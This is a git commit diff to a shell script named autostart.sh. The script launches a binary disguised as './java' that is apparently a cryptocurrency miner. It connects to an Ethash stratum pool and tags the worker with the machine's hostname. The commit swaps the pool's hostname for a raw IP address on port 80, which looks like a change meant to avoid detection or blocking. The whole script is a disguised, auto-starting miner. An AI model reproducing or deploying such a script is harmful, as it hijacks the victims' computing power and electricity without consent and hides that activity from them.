6073992168288241a073a7c179ea54995f5fe191
minnie1311 <69047664+minnie1311@users.noreply.github.com>
2022-06-06 12:48:54 +0700

    Update autostart.sh

--- autostart.sh
+++ autostart.sh
@@ -1,3 +1,3 @@
 #!/bin/sh
 
-./java -P stratum1+tcp://lovelyn.$HOSTNAME-$(date +%H-%M):123456@ethash.poolbinance.com:1800
+./java -P stratum1+tcp://lovelyn.$HOSTNAME-$(date +%H-%M):123456@20.205.19.146:80
